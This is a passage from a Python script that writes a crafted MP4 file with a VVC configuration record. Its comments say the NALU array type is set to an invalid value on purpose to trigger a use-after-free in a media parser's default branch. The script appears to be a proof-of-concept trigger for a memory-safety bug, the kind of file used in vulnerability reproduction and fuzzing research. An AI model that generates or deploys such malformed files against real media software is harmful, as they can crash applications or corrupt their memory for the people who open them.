bit) + reserved (6 bits)\n    vvcc_data += struct.pack(\'B\', (0 << 7) | (0 << 6) | 0)\n    \n    # num_sub_profiles (8 bits)\n    vvcc_data += struct.pack(\'B\', 0)\n    \n    # maxPictureWidth (16 bits)\n    vvcc_data += struct.pack(\'>H\', 1920)\n    \n    # maxPictureHeight (16 bits)\n    vvcc_data += struct.pack(\'>H\', 1080)\n    \n    # avgFrameRate (16 bits)\n    vvcc_data += struct.pack(\'>H\', 30)\n    \n    # Now the NALU arrays section\n    # count = 1 (one NALU array with invalid type)\n    vvcc_data += struct.pack(\'B\', 1)\n    \n    # NALU array header\n    # Bits: 1 array_completeness + 2 reserved + 5 NAL_unit_type\n    # Use type = 0 which is NOT in the valid switch cases\n    # This will trigger the default case, freeing ar, then accessing ar->type at line 1403\n    array_byte = (0 << 7) | (0 << 5) | 0  # completeness=0, reserved=0, type=0 (INVALID)\n    vvcc_data += struct.pack(\'B\', array_byte)\n    \n    # nalucount (16 bits) - will be read at line 1404 AFTER the UAF at 1403\n    vvcc_data += struct.pack(\'>H\', 1)\n    \n    # NALU size and data\n    vvcc_data += struct.pack(\'>H\', 4)  # size = 4 bytes\n    vvcc_data += b\'\\x00\\x00\\x00\\x00\'  # dummy NALU data\n    \n    return vvcc_data\n\ndef create_minimal_mp4():\n    """Create a minimal MP4 with VVC track"""\n    \n    with open(output_path, \'wb\') as f:\n        # ftyp box\n        ftyp_payload = b\'isom\\x00\\x00\\x00\\x00isomiso2mp41\'\n        write_box(f, \'ftyp\', ftyp_payload)\n        \n        # Build moov box content\n        moov_content = b\'\'\n        \n        # mvhd (movie header)\n        mvhd_data = struct.pack(\'>B\', 0)  # version\n        mvhd_data += struct.pack(\'>I\', 0)[1:]  # flags\n        mvhd_data += struct.pack(\'>I\', 0)  # creation_time\n        mvhd_data += struct.pack(\'>I\', 0)  # modification_time\n        mvhd_data += struct.pack(\'>I\', 1000)  # timescale\n        mvhd_data += struct.pack(\'>I\', 1000)  # duration\n        mvhd_data += struct.pa